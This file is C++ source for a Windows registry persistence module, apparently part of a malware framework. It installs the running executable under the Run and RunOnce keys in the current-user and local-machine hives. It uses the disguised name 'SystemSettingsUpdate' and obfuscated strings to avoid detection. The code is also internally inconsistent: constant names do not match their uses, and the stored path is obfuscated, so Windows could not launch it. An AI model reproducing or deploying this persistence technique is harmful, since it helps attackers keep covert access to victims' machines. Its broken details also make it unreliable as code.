#include "persistence/RegistryPersistence.h"
#include "core/Logger.h"
#include "core/Configuration.h"
#include "utils/FileUtils.h"
#include "security/Obfuscation.h"
#include <string>
#include <vector>

// Obfuscated strings
const auto OBF_REGISTRY_PERSISTENCE = OBFUSCATE("RegistryPersistence");
const auto OBF_RUN_KEY = OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
const auto OBF_RUNONCE_KEY = OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
const auto OBF_APP_NAME = OBFUSCATE("SystemSettingsUpdate");

RegistryPersistence::RegistryPersistence(Configuration* config)
    : BasePersistence(config)
#if PLATFORM_WINDOWS
    , m_installedHive(NULL)
#endif
{}

bool RegistryPersistence::Install() {
    if (IsInstalled()) {
        return true;
    }

#if PLATFORM_WINDOWS
    std::vector<HKEY> hives = { HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE };
    std::vector<const char*> keys = { OBFUSCATED_RUN_KEY, OBFUSCATED_RUNONCE_KEY };

    for (HKEY hive : hives) {
        for (const char* key : keys) {
            if (InstallInRegistry(hive, key)) {
                m_installed = true;
                m_installedHive = hive;
                m_installedKey = key;
                LOG_INFO("Registry persistence installed in hive: " + 
                         std::to_string(hive) + ", key: " + key);
                return true;
            }
        }
    }

    LOG_ERROR("Failed to install registry persistence in any location");
    return false;
#else
    return false;
#endif
}

#if PLATFORM_WINDOWS
bool RegistryPersistence::InstallInRegistry(HKEY hive, const char* key) {
    HKEY hKey;
    LONG result = RegOpenKeyExA(hive, key, 0, KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS) {
        LOG_DEBUG("Failed to open registry key: " + std::to_string(result));
        return false;
    }

    std::wstring exePath = utils::FileUtils::GetCurrentExecutablePath();
    std::string obfuscatedPath = security::Obfuscation::ObfuscateString(
        utils::StringUtils::WideToUtf8(exePath)
    );

    result = RegSetValueExA(hKey, OBFUSCATED_APP_NAME, 0, REG_SZ,
        reinterpret_cast<const BYTE*>(obfuscatedPath.c_str()),
        static_cast<DWORD>(obfuscatedPath.size() + 1));

    RegCloseKey(hKey);

    if (result == ERROR_SUCCESS) {
        LOG_DEBUG("Successfully set registry value in hive: " + 
                 std::to_string(hive) + ", key: " + key);
        return true;
    }

    LOG_DEBUG("Failed to set registry value: " + std::to_string(result));
    return false;
}
#endif

bool RegistryPersistence::Remove() {
    if (!m_installed) {
        LOG_DEBUG("Registry persistence not installed, nothing to remove");
        return true;
    }

#if PLATFORM_WINDOWS
    HKEY hKey;
    LONG result = RegOpenKeyExA(m_installedHive, m_installedKey.c_str(), 0, KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS) {
        LOG_ERROR("Failed to open registry key for removal: " + std::to_string(result));
        return false;
    }

    result = RegDeleteValueA(hKey, OBFUSCATED_APP_NAME);
    RegCloseKey(hKey);

    if (result == ERROR_SUCCESS) {
        LOG_INFO("Registry persistence removed successfully");
        m_installed = false;
        return true;
    }

    LOG_ERROR("Failed to remove registry value: " + std::to_string(result));
    return false;
#else
    return false;
#endif
}

bool RegistryPersistence::IsInstalled() const {
#if PLATFORM_WINDOWS
    std::vector<HKEY> hives = { HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE };
    std::vector<const char*> keys = { OBFUSCATED_RUN_KEY, OBFUSCATED_RUNONCE_KEY };

    for (HKEY hive : hives) {
        for (const char* key : keys) {
            if (CheckRegistryKey(hive, key)) {
                return true;
            }
        }
    }
    return false;
#else
    return false;
#endif
}

#if PLATFORM_WINDOWS
bool RegistryPersistence::CheckRegistryKey(HKEY hive, const char* key) const {
    HKEY hKey;
    LONG result = RegOpenKeyExA(hive, key, 0, KEY_READ, &hKey);
    if (result != ERROR_SUCCESS) {
        return false;
    }

    DWORD type;
    char buffer[MAX_PATH];
    DWORD bufferSize = sizeof(buffer);

    result = RegQueryValueExA(hKey, OBFUSCATED_APP_NAME, NULL, &type,
        reinterpret_cast<BYTE*>(buffer), &bufferSize);

    RegCloseKey(hKey);

    if (result == ERROR_SUCCESS && type == REG_SZ) {
        std::string value(buffer, bufferSize);
        std::string deobfuscated = security::Obfuscation::DeobfuscateString(value);
        std::wstring currentExe = utils::FileUtils::GetCurrentExecutablePath();
        
        return deobfuscated == utils::StringUtils::WideToUtf8(currentExe);
    }

    return false;
}
#endif